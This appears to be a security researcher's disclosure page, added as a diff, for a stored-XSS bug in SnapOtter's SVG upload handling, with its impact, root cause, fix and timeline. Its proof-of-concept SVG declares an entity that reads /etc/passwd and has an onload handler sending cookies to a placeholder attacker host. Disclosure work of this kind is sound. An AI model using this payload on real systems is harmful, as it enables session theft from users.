@@ -1,0 +1,91 @@
+---
+layout: reporte
+title: "GHSA-9c7h-xjrp-8gh3 — SVG sanitization bypass → stored XSS in SnapOtter"
+description: "Uploaded SVG files bypass sanitization when the image decoder rejects them — the sanitizer only runs after a successful image validation, so a failing DOCTYPE skips it entirely. HIGH. Fixed in SnapOtter v2.3.0."
+permalink: /reportes/GHSA-9c7h-xjrp-8gh3/
+---
+
+<h1>SVG sanitization bypass on decoder rejection</h1>
+
+<div class="meta-badges">
+  <span class="badge badge-tipo">XSS</span>
+  <span class="badge badge-sev-high">HIGH</span>
+  <span class="badge badge-cwe">CWE-79: Cross-site Scripting</span>
+  <span class="badge badge-id">snapotter-hq/SnapOtter ≤ 2.2.0</span>
+</div>
+
+<p>
+  <a href="https://github.com/snapotter-hq/SnapOtter/security/advisories/GHSA-9c7h-xjrp-8gh3">GHSA-9c7h-xjrp-8gh3</a> · CVE assignment pending (GitHub CNA)
+</p>
+
+<h2>Summary</h2>
+
+<p>Both upload routes — the standalone <code>POST /api/v1/upload</code> and the library <code>POST /api/v1/files/upload</code> — ran the SVG sanitizer only <em>after</em> the image validator had decoded the file:</p>
+
+<pre><code class="language-typescript">// apps/api/src/routes/files.ts:117 (same shape at user-files.ts:337)
+const safeBuffer = isValidImage &amp;&amp; isSvgBuffer(buffer)
+    ? sanitizeSvg(buffer)
+    : buffer;
+</code></pre>
+
+<p>Because the routes accept any file type, an SVG that librsvg (via Sharp) cannot parse is stored anyway: a DOCTYPE declaring an external entity makes the parser fail, <code>isValidImage</code> is <code>false</code>, and the <code>&amp;&amp;</code> short-circuit skips <code>sanitizeSvg()</code> entirely. The raw file is later served as <code>image/svg+xml</code> with its DOCTYPE, entity declarations, and any scriptable markup intact.</p>
+
+<p>Two related weaknesses inside the sanitizer itself:</p>
+
+<ul>
+  <li>It stripped only <em>unprefixed</em> dangerous elements, so a namespace-prefixed <code>&lt;x:script&gt;</code> survived even on SVGs the decoder accepted.</li>
+  <li>Its DOCTYPE-removal regex broke when a <code>]</code> appeared inside a quoted entity value.</li>
+</ul>
+
+<h2>Impact</h2>
+
+<ul>
+  <li><strong>Stored XSS</strong> — an authenticated user who can upload files stores an SVG carrying active markup; a viewer who opens the stored SVG directly in a browser (or any surface that renders it inline) runs the embedded script.</li>
+  <li><strong>Unauthenticated retrieval</strong> — the staged-upload download URL <code>/api/v1/download/:jobId/:filename</code> requires no authentication, so anyone with the job id can fetch the file.</li>
+  <li><strong>Attack vector:</strong> network — upload as authenticated user, then victim interaction.</li>
+  <li>The chained file-read and request-forgery vectors from the original report did <strong>not</strong> reproduce in the shipped app: librsvg refuses to resolve the external entity (that refusal is exactly why validation fails), the tool routes reject invalid SVGs before processing, downloads carry <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code>, and the response CSP allows no inline script — so a stored SVG does not execute as a document served from the app origin.</li>
+</ul>
+
+<h2>Root Cause</h2>
+
+<p>Sanitization was coupled to successful image validation instead of running on every SVG-bearing upload. The fix inverts the responsibility: both upload routes now sanitize SVG content regardless of whether the image decoder accepts the file, the sanitizer strips namespace-prefixed dangerous elements, and SVG detection plus DOCTYPE removal handle a prolog and quoted values.</p>
+
+<h2>Proof of Concept</h2>
+
+<p>Crafted SVG whose DOCTYPE makes the decoder fail, bypassing the sanitizer:</p>
+
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)"&gt;
+  &lt;text&gt;payload&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+
+<p>The reproduction used four payloads — <code>xss-event.svg</code> (onload execution), <code>xss-cookie.svg</code> (cookie exfiltration), <code>xxe-file-read.svg</code> and <code>ssrf-metadata.svg</code> (the two vectors later ruled out by the advisory impact analysis) — uploaded with an authenticated session, then fetched via the unauthenticated download URL and opened in a browser to confirm script execution.</p>
+
+<h2>Disclosure Timeline</h2>
+
+<table>
+  <thead><tr><th>Date</th><th>Event</th></tr></thead>
+  <tbody>
+    <tr><td>2026-09-11</td><td>Vulnerability discovered during authorized audit</td></tr>
+    <tr><td>2026-09-12</td><td>PoC and demo videos created; report sent to contact@snapotter.com</td></tr>
+    <tr><td>2026-09-14</td><td>No acknowledgment after 48h — follow-up sent</td></tr>
+    <tr><td>2026-09-19</td><td>Maintainer confirmed the vulnerability, classified it <strong>High</strong>, credit to <a href="https://github.com/xaferima">xaferima</a></td></tr>
+    <tr><td>2026-09-20</td><td>Downgrade to HIGH accepted (librsvg blocks XXE); CVE to be requested via GitHub CNA</td></tr>
+    <tr><td>2026-11-03</td><td>Advisory published — GHSA-9c7h-xjrp-8gh3 — and fixed in SnapOtter v2.3.0</td></tr>
+    <tr><td>Pending</td><td>CVE assignment via GitHub CNA</td></tr>
+  </tbody>
+</table>
+
+<h2>Fix</h2>
+
+<p>Sanitize SVG uploads unconditionally — independent of the image validator — strip namespace-prefixed dangerous elements, and harden SVG detection and DOCTYPE removal:</p>
+
+<pre><code class="language-typescript">// Both upload routes, after the fix:
+const safeBuffer = isSvgBuffer(buffer) ? sanitizeSvg(buffer) : buffer;
+</code></pre>
+
+<p><em>Fixed in SnapOtter v2.3.0 (2026-11-03, also the project's one-million-pull thank-you release, which credits this report in the release notes). Advisory published 2026-11-03; CVE assignment pending.</em></p>
